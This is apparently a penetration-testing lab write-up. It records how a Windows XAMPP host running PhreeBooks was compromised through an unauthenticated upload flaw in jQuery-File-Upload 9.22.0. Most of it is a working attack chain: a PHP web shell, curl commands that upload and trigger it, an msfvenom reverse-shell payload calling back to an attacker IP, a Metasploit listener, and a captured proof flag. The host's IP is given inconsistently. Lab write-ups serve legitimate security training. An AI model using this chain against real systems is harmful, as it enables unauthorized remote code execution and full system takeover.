## Host Information
* Hostname: xor-app59
* IP: 10.10.1.123 
* Homepage shows XAMPP for Windows 7.3.5
* Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.5
* App uses PhreeBooks/Bizuno ERP (version still needs to be confirmed)
	* Possible Exploits
		* https://www.exploit-db.com/exploits/49524

## Index of /books/apps

![[dir-books-apps.png]]

* Interesting files
	* jquery 3.2.1
	* jquery-file-upload dir
		* https://www.exploit-db.com/exploits/45584
	* jquery-file-download.js
	* PHPMailer (version 5.2.22)

jQuery-File-Upload 9.22.0 - Arbitrary File Upload
===
http://10.11.1.123/books/apps/jquery-file-upload/js/jquery.fileupload.js
![[file-uploader.png]]

**Vulnerability**
```txt
# https://www.exploit-db.com/exploits/45584
# Vulnerability:
# The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php 
# doesn't require any validation to upload files to the server.  It also doesn't exclude file types.  
# This allows for remote code execution.
```

**PHP shell**
```php
/*x.php*/
<?php $cmd=$_GET['cmd']; system($cmd);?>
```

**curl Request to upload shell** 
```shell
curl -F "files=@x.php" http://10.11.1.123/books/apps/jquery-file-upload/server/php/index.php
```

**Generate payload**
```shell
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.151 LPORT=9001 -f exe -o r.exe
```

**curl Request to upload the payload**
```shell
curl -F "files=@r.exe" http://10.11.1.123/books/apps/jquery-file-upload/server/php/index.php
```

**curl Request to execute payload**
```shell
curl http://10.11.1.123/books/apps/jquery-file-upload/server/php/files/x.php?cmd=r.exe
```


**Listener**
```shell
msfconsole -q -x "use multi/handler; set payload windows/x64/shell/reverse_tcp; set lhost 192.168.119.151; set lport 9001; exploit"
```

**Reverse shell runnning as nt authority\system**
![[xor-app59-shell.png]]

**proof.txt**
```txt
d763662138a1c060aeab1a74752f5ad3
```

![[xor-app59-proof.png]]